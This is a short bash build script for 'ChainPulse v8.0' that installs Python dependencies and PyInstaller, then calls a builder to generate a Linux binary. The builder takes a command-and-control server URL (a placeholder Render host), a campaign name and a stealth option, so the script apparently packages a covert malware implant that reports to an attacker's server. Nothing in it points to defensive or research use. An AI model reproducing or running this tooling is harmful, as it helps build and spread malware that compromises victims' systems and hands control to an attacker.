#!/bin/bash
# ChainPulse v8.0 — Build Linux binary
set -e
C2_URL="${C2_URL:-https://SEU-SERVICO.onrender.com}"
CAMPAIGN="${CAMPAIGN:-campanha-01}"
NAME="${NAME:-ChainPulse}"

echo "[*] Installing deps..."
python3 -m pip install -r requirements.txt pyinstaller -q

echo "[*] Building Linux binary..."
python3 builder/generate.py --target linux --exe --name "$NAME" --c2 "$C2_URL" --campaign "$CAMPAIGN" --stealth standard -o ./output

echo "[+] Done: ./output/linux/${NAME}-linux"
